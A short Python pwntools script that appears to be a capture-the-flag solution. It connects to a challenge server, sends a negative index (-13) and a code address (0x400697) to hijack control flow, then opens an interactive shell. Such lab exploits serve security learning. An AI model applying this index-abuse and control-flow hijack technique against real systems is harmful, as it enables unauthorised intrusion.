#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10126

r = remote(host, port)
r.recvuntil('?')
r.sendline('-13')
r.recvuntil('?')
r.sendline(str(0x400697))
r.recvuntil('?\n')
r.interactive()
